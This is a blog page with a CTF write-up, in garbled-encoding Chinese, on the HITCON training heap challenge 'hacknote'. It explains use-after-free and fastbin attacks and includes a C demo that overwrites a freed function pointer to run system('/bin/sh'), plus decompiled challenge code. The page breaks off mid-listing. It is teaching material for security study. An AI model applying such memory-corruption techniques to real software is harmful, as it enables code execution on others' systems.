<!DOCTYPE HTML>
<html lang="zh-CN">
<head>
    <head>
    <meta charset="utf-8">
    <meta name="keywords" content="è‚–äº¦æ«, hexo-theme-matery">
    <meta name="description" content="æ‰€æœ‰çš„å¹¸ç¦åé¢,éƒ½æœ‰äººåœ¨è´Ÿé‡å‰è¡Œ.">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>Yof3ng&#39;s Blog | çƒ­çˆ±åˆ†äº«</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
</head>

<body>

<header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="container">
            <div class="nav-wrapper">
                <div class="brand-logo">
                    <a href="/" class="waves-effect waves-light">
                        
                        <img src="/medias/logo.png" class="logo-img hide-on-small-only">
                        
                        <span class="logo-span">Yof3ng's Blog | çƒ­çˆ±åˆ†äº«</span>
                    </a>
                </div>
                <a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right">
    
    <li class="hide-on-med-and-down">
        <a href="/" class="waves-effect waves-light">
            
            <i class="fa fa-home"></i>
            
            <span>home(ä¸»é¡µ)</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/tags" class="waves-effect waves-light">
            
            <i class="fa fa-tags"></i>
            
            <span>tags(æ ‡ç­¾)</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/categories" class="waves-effect waves-light">
            
            <i class="fa fa-bookmark"></i>
            
            <span>categories(ç›®å½•)</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/archives" class="waves-effect waves-light">
            
            <i class="fa fa-archive"></i>
            
            <span>archives(å½’æ¡£)</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/about" class="waves-effect waves-light">
            
            <i class="fa fa-user-circle-o"></i>
            
            <span>about(å…³äº)</span>
        </a>
    </li>
    
    <li>
        <a id="toggleSearch" class="waves-effect waves-light">
            <i id="searchIcon" class="mdi-action-search"></i>
        </a>
    </li>

</ul>

<div class="side-nav" id="mobile-nav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Yof3ng's Blog | çƒ­çˆ±åˆ†äº«</div>
        <div class="logo-desc">
            
            æ‰€æœ‰çš„å¹¸ç¦åé¢,éƒ½æœ‰äººåœ¨è´Ÿé‡å‰è¡Œ.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li>
            <a href="/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-home"></i>
                
                home(ä¸»é¡µ)
            </a>
        </li>
        
        <li>
            <a href="/tags" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-tags"></i>
                
                tags(æ ‡ç­¾)
            </a>
        </li>
        
        <li>
            <a href="/categories" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-bookmark"></i>
                
                categories(ç›®å½•)
            </a>
        </li>
        
        <li>
            <a href="/archives" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-archive"></i>
                
                archives(å½’æ¡£)
            </a>
        </li>
        
        <li>
            <a href="/about" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-user-circle-o"></i>
                
                about(å…³äº)
            </a>
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/yof3ng" class="waves-effect waves-light" target="_blank">
                <i class="fa fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>

    <div class="social-link"><a href="https://github.com/yof3ng" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">
    <i class="fa fa-github"></i>
</a>
<a href="mailto:yof3ng@gmail.com" class="tooltipped" target="_blank" data-tooltip="é‚®ä»¶è”ç³»æˆ‘" data-position="top" data-delay="50">
    <i class="fa fa-envelope-open"></i>
</a>
<a href="#!" class="tooltipped" data-tooltip="QQè”ç³»æˆ‘: 877153299" data-position="top" data-delay="50">
    <i class="fa fa-qq"></i>
</a>

<a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS è®¢é˜…" data-position="top" data-delay="50">
    <i class="fa fa-rss"></i>
</a>
</div>
</div>

            </div>
        </div>

        
        <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/yof3ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>
</header>



<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <div class="description center-align post-title">
                        Pwn-11æœˆ02-Hitcon-å…­
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<main class="post-container content">

    
    <style>
    #artDetail h1,
    #artDetail h2,
    #artDetail h3,
    #artDetail h4,
    #artDetail h5,
    #artDetail h6 {
        padding-top: 76px;
        margin-top: -76px;
    }

    #artDetail h1 {
        line-height: 3.3rem;
    }

    #artDetail h2 {
        line-height: 3rem;
    }

    #artDetail h3 {
        line-height: 2.5rem;
    }

    #artDetail h4 {
        line-height: 2.2rem;
    }

    #artDetail h5 {
        line-height: 1.9rem;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        padding-left: 20px;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    .post-toc ol {
        padding-left: 20px;
    }

    .post-toc a {
        color: #34495e;
        font-size: 0.96rem;
    }

    .post-toc a:hover {
        color: #42b983;
        text-decoration: underline;
    }

    .post-toc .active {
        color: #42b983;
        font-weight: 500;
    }
</style>
<div class="row">
    <div class="col s12 m12 l9">
        <!-- æ–‡ç« å†…å®¹è¯¦æƒ… -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            
            <div class="article-tag">
                
                <a href="/tags/Pwn/" target="_blank">
                    <span class="chip bg-color">Pwn</span>
                </a>
                
                <a href="/tags/CTF/" target="_blank">
                    <span class="chip bg-color">CTF</span>
                </a>
                
                <a href="/tags/äºŒè¿›åˆ¶å®‰å…¨/" target="_blank">
                    <span class="chip bg-color">äºŒè¿›åˆ¶å®‰å…¨</span>
                </a>
                
            </div>
            
            <div class="post-info">
                
                <span class="post-cate">
                    <i class="fa fa-bookmark fa-fw icon-category"></i>
                    
                    <a href="/categories/CTF/" class="post-category" target="_blank">
                        CTF
                    </a>
                    
                </span>
                

                <span class="post-date">
                    <i class="fa fa-clock-o fa-fw"></i>2018-11-02
                </span>
            </div>
        </div>
        <hr>
        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>[TOC]</p>
<h1 id="Pwn-11æœˆ02-Hitcon-å…­"><a href="#Pwn-11æœˆ02-Hitcon-å…­" class="headerlink" title="Pwn-11æœˆ02-Hitcon-å…­"></a>Pwn-11æœˆ02-Hitcon-å…­</h1><blockquote>
<p>è¿›åº¦è¿˜æ˜¯å¤ªæ…¢äº†ï¼Œä¸èƒ½å†å¢¨è¿¹ä¸‹å»äº†ğŸ’ªï¼ï¼</p>
</blockquote>
<h2 id="lab10-hacknote"><a href="#lab10-hacknote" class="headerlink" title="lab10-hacknote"></a>lab10-hacknote</h2><blockquote>
<p>&nbsp; &nbsp; &nbsp; &nbsp; è¿™æ˜¯ä¸€é“ fastbin uafåˆ©ç”¨ï¼Ÿfastbinæ˜¯ä»€ä¹ˆï¼Ÿuafåˆæ˜¯ä»€ä¹ˆï¼Ÿåˆæ˜¯ä¸€é“æ¶¨å§¿åŠ¿çš„é¢˜å‘¢ã€‚å•Šå•Šå•Šä»è¿™å„¿å¼€å§‹å°±æ¥è§¦å †è¿™ç©æ„å„¿äº†ï¼ï¼ï¼</p>
<p><a href="https://www.sohu.com/a/239388523_354899" target="_blank" rel="noopener">å †æº¢å‡ºå­¦ä¹ ä¹‹è·¯</a></p>
</blockquote>
<h3 id="UAF-use-after-free"><a href="#UAF-use-after-free" class="headerlink" title="UAF (use after free)"></a>UAF (use after free)</h3><blockquote>
<p>&nbsp; &nbsp; &nbsp; &nbsp; Use after freeï¼Œè·Ÿå­—é¢ä¸Šçš„æ„æ€ä¸€æ ·ï¼šç¬¬ä¸€æ¬¡ç”³è¯·çš„å†…å­˜ç©ºé—´åœ¨é‡Šæ”¾è¿‡åæ²¡æœ‰è¿›è¡Œå†…å­˜å›æ”¶ï¼Œå¯¼è‡´ä¸‹æ¬¡ç”³è¯·å†…å­˜çš„æ—¶å€™å†æ¬¡ä½¿ç”¨è¯¥å†…å­˜å—ï¼Œä½¿å¾—ä»¥å‰çš„å†…å­˜æŒ‡é’ˆå¯ä»¥è®¿é—®ä¿®æ”¹è¿‡çš„å†…å­˜ã€‚</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; é‚£é€šè¿‡UAFæ¼æ´ï¼Œæˆ‘ä»¬èƒ½å¹²å˜›ï¼Œå½“ç„¶æ˜¯ç›´æ¥getshellï¼Œé€šè¿‡ä¸‹é¢ä¸€æ®µcç¨‹åºï¼Œè¿›è¡Œç¼–è¯‘å°±èƒ½getshelläº†ï¼ˆç¨‹åºä»£ç æ¥è‡ª<a href="https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1" target="_blank" rel="noopener">4ct10nçš„åšå®¢</a> ï¼‰ï¼š</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func_ptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">evil_fuc</span><span class="token punctuation">(</span><span class="token keyword">char</span> command<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token keyword">char</span> content<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    func_ptr <span class="token operator">*</span>p1<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>echo<span class="token punctuation">;</span>
    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello world\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//åœ¨è¿™é‡Œfreeäº†p1,ä½†å¹¶æœªå°†p1ç½®ç©º,å¯¼è‡´åç»­å¯ä»¥å†ä½¿ç”¨p1æŒ‡é’ˆ</span>
    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello again\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p1æŒ‡é’ˆæœªè¢«ç½®ç©º,è™½ç„¶freeäº†,ä½†ä»å¯ä½¿ç”¨.</span>
    func_ptr <span class="token operator">*</span>p2<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//mallocåœ¨freeä¸€å—å†…å­˜å,å†æ¬¡ç”³è¯·åŒæ ·å¤§å°çš„æŒ‡é’ˆä¼šæŠŠåˆšåˆšé‡Šæ”¾çš„å†…å­˜åˆ†é…å‡ºæ¥.</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//p2ä¸p1æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸ºåŒä¸€åœ°å€</span>
    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>evil_fuc<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//åœ¨è¿™é‡Œå°†p1æŒ‡é’ˆé‡Œé¢ä¿å­˜çš„echoå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆä¸ºäº†evil_funcæŒ‡é’ˆ.</span>
    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre>
<p>ç¼–è¯‘è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2018/11/02/5bdbf64c0bcc4.png" alt=""></p>
</blockquote>
<h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><blockquote>
<p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">fast binå‚è€ƒPDF</a></p>
<p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194003.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194047.png" alt=""></p>
<p>fastbin attack é€šå¸¸ä¸å †å—è”ç³»åœ¨ä¸€èµ·ï¼Œæ˜¯CTFä¸­å¸¸è§é¢˜å‹ã€‚</p>
<p>å®šä¹‰å¦‚ä¸‹ï¼š</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; Fastbin Attackæ˜¯fastbinåœ¨å­˜å‚¨ç®¡ç†æ—¶ï¼Œä¸ºä¿è¯å¿«é€Ÿåˆ†é…ï¼Œå›æ”¶å†…å­˜çš„éœ€è¦ï¼Œåœ¨å†…å­˜ç®¡ç†çš„æœºåˆ¶ä¸­å‡ºç°çš„é—®é¢˜ï¼Œè¿›è€Œé€ æˆçš„æ¼æ´ï¼Œèƒ½å¤Ÿé€šè¿‡æ¼æ´æ”¹å†™main_arenaä¸Šçš„FasbinYæŒ‡é’ˆæ•°ç»„ï¼Œä»è€Œè·å¾—â€œç‰¹å®šâ€ï¼ˆéœ€è¦æ»¡è¶³ä¸€å®šæ¡ä»¶ï¼‰åœ°å€çš„å†™æƒé™ã€‚</p>
<p>è‡³äºmain_arenaï¼Œå°±å¼•ç”¨ä¸€ä¸‹stackoverflowçš„è§£é‡Šå’¯ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102215928.png" alt=""></p>
<p><code>main_arena</code> is a local symbol and is specifically <strong>not exported</strong>. the list of exported symbols is controlled via the <code>Version</code> files in the glibc source tree. this is, by design, to keep people from being able to link against random symbols that glibc uses internally (so as to not pollute the namespace as is required by POSIX and other standards).</p>
<blockquote>
<p>main_arenaæ˜¯ä¸èƒ½å¯¼å‡ºçš„ä¸€ä¸ªæœ¬åœ°ç¬¦å·è¡¨ã€‚å¯¼å‡ºç¬¦å·åˆ—è¡¨éœ€è¦é€šè¿‡glibcæºä»£ç ç›®å½•ä¸­çš„Versionæ–‡ä»¶æ§åˆ¶ã€‚è¿™æ˜¯è®¾è®¡ç”¨äºé˜²æ­¢äººä»¬é“¾æ¥glibcå†…éƒ¨ä½¿ç”¨çš„éšæœºç¬¦å·ï¼Œï¼ˆæ‰€ä»¥ä¸ä¼šåƒPOSIXå’Œå…¶ä»–æ ‡å‡†é‚£æ ·æ±¡æŸ“å‘½åç©ºé—´ï¼‰ã€‚</p>
</blockquote>
<p>gdb can find it because you have debug symbols available â€¦ either the C lib is not stripped, or you have the split debug symbols in <code>/usr/lib/debug/</code> and gdb is finding those. when you launch gdb, it will tell you things like <code>Reading symbols from /usr/lib/debug/xxxxx</code>.</p>
<blockquote>
<p>gdbå¯ä»¥æ‰¾åˆ°main_arenaï¼Œå› ä¸ºä½ å¯ä»¥è·å¾—ä¸€äº›è°ƒè¯•ç¬¦å·è¡¨â€¦å½“ç¨‹åºæ²¡æœ‰è¢«è„±è¡£æœ(not stripped)ï¼Œæˆ–è€…ä½ åœ¨<code>/ usr / lib / debug /</code>ä¸­æ‹†åˆ†è¿‡è°ƒè¯•ç¬¦å·ï¼Œè€Œgdbå¯ä»¥æ‰¾åˆ°å®ƒä»¬ã€‚å½“ä½ å¯åŠ¨gdbè¿›è¡Œè°ƒè¯•æ—¶ï¼Œå®ƒä¼šæ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ï¼Œä¾‹å¦‚<code>loading symbols from / usr / lib / debug / xxxxx</code>è¿™ç§è°ƒè¯•ä¿¡æ¯ã€‚</p>
</blockquote>
<p>the only way to be able to link against the symbol is to rebuild glibc from source and modify the export list.</p>
<blockquote>
<p>å”¯ä¸€èƒ½å¤Ÿé“¾æ¥åˆ°ç¬¦å·çš„æ–¹æ³•æ˜¯ä»æºé‡æ„GLIBCå¹¶ä¿®æ”¹å¯¼å‡ºåˆ—è¡¨ã€‚</p>
</blockquote>
<p>alternatively, you could write some code in your app to behave like gdb. namely, open the debug file, process the ELF/DWARF information in it, apply relocations using the active loaded library info (see <code>dl_iterate_phdr</code>), and then just start poking memory directly.</p>
<blockquote>
<p>æˆ–è€…ï¼Œä½ å¯ä»¥åœ¨ä½ çš„åº”ç”¨ç¨‹åºä¸­ç¼–å†™ä¸€äº›ä»£ç æ¥åƒgdbè°ƒè¯•ä¸€æ ·ã€‚å³é€šè¿‡åº”ç”¨ç¨‹åºï¼Œæ‰“å¼€è°ƒè¯•æ–‡ä»¶ï¼Œå¤„ç†å…¶ä¸­çš„ELF / DWARFä¿¡æ¯ï¼Œä½¿ç”¨æ´»åŠ¨åŠ è½½çš„åº“ä¿¡æ¯åº”ç”¨é‡å®šä½ï¼ˆè¯·å‚é˜…dl_iterate_phdrï¼‰ï¼Œç„¶åç›´æ¥å¼€å§‹è°ƒç”¨å†…å­˜ã€‚</p>
</blockquote>
<p>if thatâ€™s too much work, a hackery solution might be to <code>fork()</code>+<code>popen()</code> gdb against your own process and run it in batch mode to dump symbol info.</p>
<blockquote>
<p>å¦‚æœé‚£å¤ªè¿‡äºéº»çƒ¦ï¼Œé»‘å®¢ä¸€ç‚¹çš„è§£å†³æ–¹æ¡ˆå¯èƒ½æ˜¯<code>forkï¼ˆï¼‰+ popenï¼ˆï¼‰</code>gdbè°ƒè¯•ä½ è‡ªå·±çš„è¿›ç¨‹ï¼Œå¹¶ä»¥æ‰¹å¤„ç†æ¨¡å¼è¿è¡Œå®ƒæ¥è½¬å‚¨ç¬¦å·ä¿¡æ¯ã€‚</p>
</blockquote>
<pre class=" language-c"><code class="language-c">
<span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">;</span>
FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>

<span class="token function">asprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cmd<span class="token punctuation">,</span> <span class="token string">"gdb -q -p %i -batch -ex 'p &amp;main_arena'"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// parse the output of |fp| here looking for the address.</span>

<span class="token function">free</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
</blockquote>
<h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote>
<p>é‚£ä¹ˆå¼€å§‹åšé¢˜å§ï¼Œå…ˆchecksec:</p>
<p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203217.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå¼€å¯äº†æ ˆæº¢å‡ºä¿æŠ¤ä»¥åŠæ ˆä¸å¯æ‰§è¡Œï¼Œé‚£ä¹ˆè¿™é¢˜å¾ˆæ˜æ˜¾å°±æ˜¯è®©æˆ‘ä»¬ä»åˆ«çš„åœ°æ–¹å…¥æ‰‹ã€‚</p>
</blockquote>
<h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote>
<p>å…ˆç®€å•è¿è¡Œä¸€ä¸‹ç¨‹åºï¼š</p>
<p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203545.png" alt=""></p>
<p>è¿™ç§noteç±»é¢˜ç›®å¯ä»¥è¯´æ˜¯æ¯”è¾ƒå¸¸è§äº†ã€‚ã€‚ã€‚å³ä½¿æˆ‘ä¸æ˜¯pwnå¸ˆå‚…ï¼Œæˆ‘ä¹Ÿé‡åˆ°è¿‡å¾ˆå¤šæ¬¡ï¼Œå½“ç„¶æ˜¯ä¸€è„¸æ‡µé€¼äº†ï¼ŒğŸ˜­ã€‚</p>
</blockquote>
<p>é€šè¿‡IDAé™æ€åˆ†æmainå‡½æ•°ï¼Œå¯ä»¥å¾—åˆ°ä¸‹é¢çš„ä¼ªCä»£ç ï¼š</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//mainå‡½æ•°</span>
<span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//èœå•</span>
      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      v3 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//åˆ é™¤æŒ‡å®šå¯¹è±¡</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//æ‰“å°å¯¹è±¡</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
